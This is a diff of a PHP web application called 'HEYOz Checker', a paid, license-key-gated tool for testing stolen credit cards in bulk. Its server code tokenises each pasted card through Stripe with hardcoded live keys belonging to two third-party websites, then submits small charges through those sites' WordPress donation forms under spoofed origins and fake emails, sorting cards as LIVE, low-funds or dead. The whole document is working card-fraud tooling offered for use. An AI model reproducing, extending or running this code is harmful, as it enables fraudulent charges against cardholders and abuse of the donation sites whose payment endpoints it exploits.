@@ -20,7 +20,6 @@ if (isset($_GET['logout'])) {
     $all_keys = get_keys();
     $ckey = $_SESSION['user_key'];
     if (isset($all_keys[$ckey])) {
-        // အသုံးပြုသူထွက်သွားလျှင် Lock ကို ပြန်ဖွင့်ပေးသည်
         $all_keys[$ckey]['session_id'] = "";
         save_keys($all_keys);
     }
@@ -39,38 +38,29 @@ if (isset($_POST['login_key'])) {
         } elseif ($all_keys[$input_key]['credits'] < 5) {
             $error = "Insufficient Credits (Min 5)!";
         } 
-        // --- Single User Lock စစ်ဆေးခြင်း ---
         elseif (!empty($all_keys[$input_key]['session_id']) && $all_keys[$input_key]['session_id'] !== session_id()) {
             $error = "Key is already used by another device!";
         } else {
-            // Login အောင်မြင်လျှင် Session ID ကို Key နှင့်အတူ သိမ်းလိုက်သည်
             $all_keys[$input_key]['session_id'] = session_id();
             save_keys($all_keys);
-            
             $_SESSION['user_key'] = $input_key;
             $_SESSION['logged_in'] = true;
         }
     } else { $error = "Invalid License Key!"; }
 }
 
-// --- Auto-Check Validity (Key Expired or Low Credits or Lock Check) ---
+// --- Auto-Check Validity ---
 if (isset($_SESSION['logged_in'])) {
     $ckey = $_SESSION['user_key'];
     $all_keys = get_keys();
-    
-    // Key မရှိတော့ခြင်း၊ သက်တမ်းကုန်ခြင်း၊ Credits နည်းခြင်း သို့မဟုတ် တခြားစက်မှ ဝင်လာခြင်းရှိမရှိ စစ်ဆေးသည်
-    if (!isset($all_keys[$ckey]) || 
-        date('Y-m-d') > $all_keys[$ckey]['expiry'] || 
-        $all_keys[$ckey]['credits'] < 5 ||
-        $all_keys[$ckey]['session_id'] !== session_id()) {
-        
+    if (!isset($all_keys[$ckey]) || date('Y-m-d') > $all_keys[$ckey]['expiry'] || $all_keys[$ckey]['credits'] < 5 || $all_keys[$ckey]['session_id'] !== session_id()) {
         session_destroy();
         header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
         exit;
     }
 }
 
-// Login Form
+// Login Form (Premium Style)
 if (!isset($_SESSION['logged_in'])) {
     ?>
     <!DOCTYPE html>
@@ -80,11 +70,10 @@ if (!isset($_SESSION['logged_in'])) {
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         body { margin: 0; padding: 0; background: #080a0f; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        .login-card { background: rgba(22, 27, 34, 0.8); backdrop-filter: blur(10px); padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); width: 350px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); position: relative; z-index: 2; }
+        .login-card { background: rgba(22, 27, 34, 0.8); backdrop-filter: blur(10px); padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); width: 350px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
         .logo-icon { font-size: 50px; color: #58a6ff; margin-bottom: 20px; text-shadow: 0 0 20px rgba(88, 166, 255, 0.5); }
         h2 { color: #fff; margin-bottom: 25px; font-weight: 600; letter-spacing: 1px; }
-        input { width: 100%; padding: 15px; margin-bottom: 20px; background: rgba(1, 4, 9, 0.5); border: 1px solid #30363d; color: #58a6ff; border-radius: 12px; box-sizing: border-box; text-align: center; font-size: 16px; outline: none; transition: 0.3s; }
-        input:focus { border-color: #58a6ff; box-shadow: 0 0 15px rgba(88,166,255,0.1); }
+        input { width: 100%; padding: 15px; margin-bottom: 20px; background: rgba(1, 4, 9, 0.5); border: 1px solid #30363d; color: #58a6ff; border-radius: 12px; box-sizing: border-box; text-align: center; font-size: 16px; outline: none; }
         button { width: 100%; padding: 15px; background: linear-gradient(45deg, #238636, #2ea043); color: white; border: none; border-radius: 12px; cursor: pointer; font-weight: 600; font-size: 16px; box-shadow: 0 10px 20px rgba(35, 134, 54, 0.3); transition: 0.3s; }
         button:hover { transform: translateY(-2px); opacity: 0.9; }
         .err { color: #f85149; margin-bottom: 15px; font-size: 14px; font-weight: bold; background: rgba(248, 81, 73, 0.1); padding: 8px; border-radius: 8px; }
@@ -96,7 +85,7 @@ if (!isset($_SESSION['logged_in'])) {
     <?php exit;
 }
 
-// --- Server-Side Logic ---
+// --- Server-Side Logic (Gate & Charge) ---
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
     header("Content-Type: application/json");
     $ckey = $_SESSION['user_key'];
@@ -107,7 +96,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
     $data = json_decode(file_get_contents('php://input'), true);
     $ccx = $data['card'] ?? "";
     $gate = $data['gate'] ?? "gate1"; 
-    if (empty($ccx)) { echo json_encode(["status" => "DEAD", "msg" => "No Card Data"]); exit; }
+    
     if (preg_match('/(\d{15,16})[\s|:|\\/]+(\d{1,2})[\s|:|\\/]+(\d{2,4})[\s|:|\\/]+(\d{3,4})/', $ccx, $matches)) {
         $cc = $matches[1]; $mes = $matches[2]; $ano = $matches[3]; $cvv = $matches[4];
     } else {
@@ -117,23 +106,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
     }
     if (strlen($mes) == 1) $mes = "0" . $mes;
     if (strlen($ano) == 4) $ano = substr($ano, 2);
+    
     $bin = substr($cc, 0, 6);
     $ch_bin = curl_init("https://lookup.binlist.net/" . $bin);
     curl_setopt($ch_bin, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch_bin, CURLOPT_TIMEOUT, 3);
     $bin_res = json_decode(curl_exec($ch_bin), true);
-    if ($bin_res && isset($bin_res['scheme'])) {
-        $brand = strtoupper($bin_res['scheme'] ?? 'UNK');
-        $bank = $bin_res['bank']['name'] ?? 'Unknown Bank';
-        $country = $bin_res['country']['emoji'] ?? '🏳️';
-        $bin_info = "[$brand - $bank $country]";
-    } else {
-        $f = substr($cc, 0, 1);
-        $fallback_brand = ($f == '4') ? "VISA" : (($f == '5') ? "MASTER" : "UNK");
-        $bin_info = "[$fallback_brand - BIN LIMIT]";
-    }
+    $brand = strtoupper($bin_res['scheme'] ?? 'UNK');
+    $bank = $bin_res['bank']['name'] ?? 'Unknown Bank';
+    $country = $bin_res['country']['emoji'] ?? '🏳️';
+    $bin_info = "[$brand - $bank $country]";
+    
     $email = 'jhsha' . rand(100, 999) . '@gmail.com';
     $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+    
     if ($gate == "gate1") {
         $pk = 'pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d';
         $site_origin = 'https://texassouthernacademy.com';
@@ -141,14 +127,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
         $pk = 'pk_live_51MrJUoFYWOfRAL36tEpAYV8qK1PEbiqp3QXs3wjZTLCImyIh2mmkYi8nW2tZBVvfgZG7UVaurtWfwkigqQAD6KJg00VB6fcBoS';
         $site_origin = 'https://christiantvireland.ie';
     }
+
     $ch1 = curl_init('https://api.stripe.com/v1/payment_methods');
     curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch1, CURLOPT_POST, true);
-    curl_setopt($ch1, CURLOPT_HTTPHEADER, ['authority: api.stripe.com','accept: application/json','content-type: application/x-www-form-urlencoded','origin: ' . $site_origin,'user-agent: ' . $ua]);
-    curl_setopt($ch1, CURLOPT_POSTFIELDS, http_build_query(['type' => 'card','billing_details[name]' => 'John Steve','card[number]' => $cc,'card[cvc]' => trim($cvv),'card[exp_month]' => $mes,'card[exp_year]' => $ano,'key' => $pk]));
+    curl_setopt($ch1, CURLOPT_HTTPHEADER, ['authority: api.stripe.com','origin: ' . $site_origin,'user-agent: ' . $ua]);
+    curl_setopt($ch1, CURLOPT_POSTFIELDS, http_build_query(['type' => 'card','card[number]' => $cc,'card[cvc]' => trim($cvv),'card[exp_month]' => $mes,'card[exp_year]' => $ano,'key' => $pk]));
     $res1 = json_decode(curl_exec($ch1), true);
     $pm = $res1['id'] ?? null;
+
     if (!$pm) { $err = $res1['error']['message'] ?? "Tokenization Restricted"; echo json_encode(["status" => "DEAD", "msg" => "$err $bin_info ( HEYOz🔥 )"]); exit; }
+
     if ($gate == "gate1") {
         $target = 'https://texassouthernacademy.com/wp-admin/admin-ajax.php';
         $fields = ['action' => 'wp_full_stripe_inline_donation_charge', 'wpfs-form-name' => 'donate','wpfs-card-holder-email' => $email,'wpfs-stripe-payment-method-id' => $pm];
@@ -156,12 +145,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
         $target = 'https://christiantvireland.ie/wp-admin/admin-ajax.php';
         $fields = ['action' => 'wp_full_stripe_inline_donation_charge', 'wpfs-form-name' => 'website_donation','wpfs-card-holder-email' => $email,'wpfs-stripe-payment-method-id' => $pm];
     }
+    
     $ch2 = curl_init($target);
     curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch2, CURLOPT_POST, true);
     curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query($fields));
     $res2 = json_decode(curl_exec($ch2), true);
     $msg = $res2['message'] ?? "No Response";
+
     if (stripos($msg, "Successful") !== false || stripos($msg, "thank you") !== false) { 
         $st = "LIVE"; $m = "CHARGED 🔥"; 
         $all_keys = get_keys();
@@ -171,6 +162,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
     elseif (stripos($msg, "insufficient") !== false) { $st = "INSUF"; $m = "LOW FUNDS 💰"; }
     elseif (stripos($msg, "action") !== false || stripos($msg, "authentication") !== false) { $st = "CVV"; $m = "3Ds/CCN 🛡️"; }
     else { $st = "DEAD"; $m = $msg; }
+    
     $rem_c = get_keys()[$ckey]['credits'];
     echo json_encode(["status" => $st, "msg" => "$m (Credits: $rem_c) $bin_info ( HEYOz🔥 )"]); exit;
 }
@@ -191,37 +183,32 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
         
         .header-flex { display: flex; justify-content: space-between; align-items: center; background: linear-gradient(90deg, #161b22, #0d1117); padding: 15px 20px; border-radius: 15px; border: 1px solid var(--border); margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
         h1 { font-size: 1.4rem; color: var(--accent); margin: 0; text-transform: uppercase; letter-spacing: 1px; }
-        .credit-display { color: var(--accent); font-weight: bold; border: 1px solid rgba(88, 166, 255, 0.3); padding: 8px 18px; border-radius: 12px; font-size: 14px; background: rgba(88, 166, 255, 0.1); box-shadow: 0 0 15px rgba(88, 166, 255, 0.1); }
+        .credit-display { color: var(--accent); font-weight: bold; border: 1px solid rgba(88, 166, 255, 0.3); padding: 8px 18px; border-radius: 12px; font-size: 14px; background: rgba(88, 166, 255, 0.1); }
         
-        #status-display { background: #010409; border: 1px solid var(--accent); padding: 12px; border-radius: 12px; text-align: center; margin-bottom: 15px; font-family: monospace; color: var(--accent); font-weight: bold; min-height: 45px; box-shadow: inset 0 0 10px rgba(88, 166, 255, 0.1); }
+        #status-display { background: #010409; border: 1px solid var(--accent); padding: 12px; border-radius: 12px; text-align: center; margin-bottom: 15px; font-family: monospace; color: var(--accent); font-weight: bold; min-height: 45px; }
         
         .gate-select { width: 100%; background: var(--card); color: var(--accent); border: 1px solid var(--border); padding: 12px; border-radius: 10px; margin-bottom: 15px; font-weight: bold; outline: none; cursor: pointer; transition: 0.3s; }
-        .gate-select:focus { border-color: var(--accent); }
         
         .input-group { position: relative; width: 100%; }
         textarea { width: 100%; height: 160px; background: #010409; color: var(--accent); border: 1px solid var(--border); padding: 15px; border-radius: 12px; font-family: monospace; resize: none; outline: none; transition: 0.3s; }
-        textarea:focus { border-color: var(--accent); box-shadow: 0 0 15px rgba(88, 166, 255, 0.05); }
         .upload-label { position: absolute; top: 12px; right: 12px; background: #30363d; color: #c9d1d9; border: 1px solid var(--border); padding: 6px 14px; border-radius: 8px; cursor: pointer; font-size: 11px; font-weight: bold; transition: 0.3s; }
         .upload-label:hover { background: #58a6ff; color: #fff; }
         
         .controls { display: flex; gap: 12px; margin: 20px 0; }
         #btn { flex: 2; background: linear-gradient(45deg, #238636, #2ea043); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 1rem; transition: 0.3s; box-shadow: 0 10px 20px rgba(35, 134, 54, 0.2); }
-        #stopBtn { flex: 1; background: #da3633; color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; font-weight: bold; display: none; transition: 0.3s; }
+        #stopBtn { flex: 1; background: #da3633; color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; font-weight: bold; display: none; }
         #btn:hover { transform: translateY(-2px); box-shadow: 0 15px 25px rgba(35, 134, 54, 0.3); }
 
         .stats { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; margin-bottom: 20px; }
         .stat-box { background: var(--card); border: 1px solid var(--border); padding: 12px; border-radius: 15px; text-align: center; transition: 0.3s; }
-        .stat-box:hover { border-color: var(--accent); background: #1c2128; }
         .stat-box small { font-size: 10px; color: #8b949e; text-transform: uppercase; display: block; margin-bottom: 5px; }
         .stat-box span { font-size: 22px; font-weight: bold; display: block; }
 
         .result-box { background: var(--card); border: 1px solid var(--border); border-radius: 15px; margin-bottom: 12px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
         .res-head { padding: 14px 18px; font-weight: bold; font-size: 13px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.02); transition: 0.3s; }
-        .res-head:hover { background: rgba(255,255,255,0.05); }
         .res-body { display: none; padding: 10px; font-family: monospace; font-size: 12px; border-top: 1px solid var(--border); background: #0d1117; max-height: 250px; overflow-y: auto; }
         
         .LIVE { color: #3fb950; } .INSUF { color: #d29922; } .CVV { color: #58a6ff; } .DEAD { color: #f85149; }
-        .taken-time { color: #8b949e; font-size: 10px; margin-left: 10px; }
         ::-webkit-scrollbar { width: 5px; }
         ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 10px; }
     </style>
@@ -229,19 +216,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
 <body>
 <div class="wrapper">
     <div class="header-flex">
-        <h1><i class="fa-solid fa-fire-glow"></i> 𝐇𝐄𝐘𝐎𝐳 𝐂𝐡𝐞𝐜𝐤𝐞𝐫</h1>
+        <h1><i class="fa-solid fa-fire-glow"></i> 𝐇𝐄𝐘𝐎𝐳 𝐂𝐡ေ𝐜𝐤𝐞𝐫</h1>
         <div class="credit-display"><i class="fa-solid fa-coins"></i> CREDITS: <?php echo number_format(get_keys()[$_SESSION['user_key']]['credits']); ?></div>
     </div>
     
-    <div id="status-display"><i class="fa-solid fa-satellite-dish"></i> SYSTEM STATUS: IDLE</div>
+    <div id="status-display"><i class="fa-solid fa-satellite-dish"></i> SYSTEM READY</div>
 
     <select id="gate" class="gate-select">
-        <option value="gate1">⚡ GATE 1: STRIPE $1.00 (Auth)</option>
-        <option value="gate2">⚡ GATE 2: STRIPE $0.50 (Charge)</option>
+        <option value="gate1">⚡ GATE 1: STRIPE $1.00 (Charge)</option>
+        <option value="gate2">⚡ GATE 2: STRIPE $0.50 (Auth)</option>
     </select>
 
     <div class="input-group">
-        <textarea id="list" placeholder="4111222233334444|01|26|123"></textarea>
+        <textarea id="list" placeholder="Paste cards here... (Format: CC|MM|YY|CVV)"></textarea>
         <label for="fileInput" class="upload-label"><i class="fa-solid fa-file-import"></i> IMPORT</label>
         <input type="file" id="fileInput" accept=".txt" style="display: none;" onchange="handleFileUpload()">
     </div>
@@ -288,16 +275,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
 
     function toggleBox(id, header) {
         const body = document.getElementById(id);
-        const icon = header.querySelector('.fa-chevron-down');
         body.style.display = body.style.display === "block" ? "none" : "block";
     }
 
-    function stop() { 
-        isRunning = false; 
-        document.getElementById('stopBtn').style.display = 'none'; 
-        document.getElementById('btn').disabled = false; 
-        document.getElementById('status-display').innerHTML = '<i class="fa-solid fa-circle-stop"></i> SYSTEM STOPPED.';
-    }
+    function stop() { isRunning = false; document.getElementById('stopBtn').style.display = 'none'; document.getElementById('btn').disabled = false; }
 
     async function start() {
         const textArea = document.getElementById('list');
@@ -339,7 +320,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
                 if(target) {
                     const item = document.createElement('div');
                     item.style.padding = "8px 0"; item.style.borderBottom = "1px solid #21262d";
-                    item.innerHTML = `<span class="${data.status}">[${data.status}]</span> ${line} <i class="fa-solid fa-angle-right" style="font-size:10px"></i> <span class="${data.status}">${data.msg}</span> <span class="taken-time">[${timeTaken}s]</span>`;
+                    item.innerHTML = `<span class="${data.status}">[${data.status}]</span> ${line} -> <span class="${data.status}">${data.msg}</span> <span style="font-size:10px; color:#8b949e;">[${timeTaken}s]</span>`;
                     target.insertBefore(item, target.firstChild);
                 }
                 
@@ -353,11 +334,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
                 await new Promise(r => setTimeout(r, 600)); 
             } catch (e) { isRunning = false; }
         }
-        if (lines.length === 0) {
-            statusBox.innerHTML = '<i class="fa-solid fa-circle-check"></i> SCANNING FINISHED.';
-            document.getElementById('btn').disabled = false;
-            document.getElementById('stopBtn').style.display = 'none';
-        } else { stop(); }
+        stop();
+        statusBox.innerHTML = '<i class="fa-solid fa-circle-check"></i> SCANNING FINISHED.';
     }
 </script>
 </body>
